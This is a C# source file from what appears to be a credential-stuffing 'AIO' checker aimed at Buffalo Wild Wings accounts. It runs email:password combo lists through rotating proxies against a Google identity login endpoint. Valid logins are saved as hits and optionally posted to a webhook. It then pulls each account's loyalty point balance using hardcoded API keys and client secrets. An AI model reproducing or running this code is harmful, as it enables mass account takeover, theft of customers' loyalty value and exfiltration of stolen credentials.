using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class BFWmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var str2 = req
                                .Post(
                                    "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4",
                                    "{\"email\":\"" + array[0] + "\",\"password\":\"" + array[1] +
                                    "\",\"returnSecureToken\":true}", "application/json").ToString();
                            if (str2.Contains("idToken"))
                            {
                                Program.TotalChecks++;
                                Program.Hits++;
                                Export.AsResult("/Buffalo Wild Wings_hits",
                                    array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Buffalo Wild Wings", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1],
                                        "Buffalo Wild Wings");
                            }
                            else if (str2.Contains("{\"success\" : false,"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                            else
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string BuffaloWildWingsGetCaptures(string idToken)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        req.IgnoreProtocolErrors = true;
                        req.ConnectTimeout = 10000;
                        req.KeepAliveTimeout = 10000;
                        req.ReadWriteTimeout = 10000;
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.AddHeader("Content-Type", "application/json");
                        req.Authorization = $"Bearer {idToken}";
                        var strResponse = req
                            .Post(new Uri("https://us-central1-buffalo-united.cloudfunctions.net/getSession"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    "{\"data\":{\"version\":\"6.38.44\",\"platform\":\"ios\",\"recaptchaToken\":\"none\"}}")))
                            .ToString();

                        if (strResponse.Contains("\"AccessToken\":\""))
                        {
                            var profileId = Regex.Match(strResponse, "\"ProfileId\":\"(.*?)\"").Groups[1].Value;
                            var accessToken = Regex.Match(strResponse, "\"AccessToken\":\"(.*?)\"").Groups[1].Value;

                            req.AddHeader("Authorization", $"OAuth {accessToken}");
                            req.AddHeader("X_CLIENT_ID", "4171883342bf4b88aa4b88ec77f5702b");
                            req.AddHeader("X_CLIENT_SECRET", "786c1B856fA542C4b383F3E8Cdd36f3f");
                            var strResponse2 =
                                req.Get(new Uri(
                                        $"https://api.buffalowildwings.com/loyalty/v1/profiles/{profileId}/pointBalance?status=A"))
                                    .ToString();

                            if (strResponse2.Contains("PointAmount"))
                            {
                                var pointAmount = Regex.Match(strResponse2, "\"PointAmount\":(.*?),").Groups[1].Value;

                                return $"Point Balance: {pointAmount}";
                            }

                            if (strResponse2.Contains("403 ERROR"))
                            {
                            }
                        }
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}